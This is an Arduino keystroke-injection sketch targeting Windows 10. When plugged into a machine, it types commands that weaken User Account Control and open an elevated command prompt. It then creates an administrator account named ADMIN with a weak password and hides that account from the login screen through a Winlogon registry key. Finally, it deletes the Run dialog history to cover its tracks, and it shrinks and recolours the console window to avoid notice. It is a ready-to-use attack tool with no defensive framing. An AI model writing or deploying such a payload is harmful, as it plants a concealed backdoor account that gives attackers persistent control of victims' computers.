//Author: Usama Sadiq
//Target: Windows 10
//Description: Bypassing uac and creating an admin account with the name "ADMIN". Hiding the accounts from login screen.
//This script also resizes cmd to 1 line and 18 columns. 
//Deletes the windows run entries to cover our tracks.

#include<Keyboard.h>

void setup() {
  // initialize control over the keyboard:
    Keyboard.begin();
    delay(1000);

    Keyboard.press(KEY_LEFT_GUI);
    
    Keyboard.press('d');
    Keyboard.releaseAll();
    delay(100);
    
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(200);
    
    Keyboard.print("cmd");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(200);

    Keyboard.print("mode con:cols=18 lines=1");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
    delay(300);

    Keyboard.print("color FE");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(300);

    Keyboard.print("C:\\Windows\\System32\\UserAccountControlSettings.exe");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(350);

    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
    delay(350);

    Keyboard.press(KEY_DOWN_ARROW);
    Keyboard.releaseAll();

    delay(100);

    Keyboard.press(KEY_DOWN_ARROW);
    Keyboard.releaseAll();

    delay(100);

    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();

    delay(300);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(400);

    Keyboard.press(KEY_LEFT_ARROW);
    Keyboard.releaseAll();

    delay(400);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(400);

    Keyboard.print("exit");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(100);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(100);
    
    Keyboard.print("powershell Start-Process cmd -Verb runAs");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(900);

    Keyboard.print("mode con:cols=18 lines=1");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
    delay(200);

    Keyboard.print("color F0");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(200);

    Keyboard.print("net user /add ADMIN admin");
    delay(200);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("net localgroup administrators ADMIN /add");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);

    Keyboard.print("REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v ADMIN /t REG_DWORD /d 0");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(100);


    Keyboard.print("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
    delay(400);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(400);

    Keyboard.print("exit");
    delay(100);

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
    
}

void loop() {
  // put your main code here, to run repeatedly:
  }
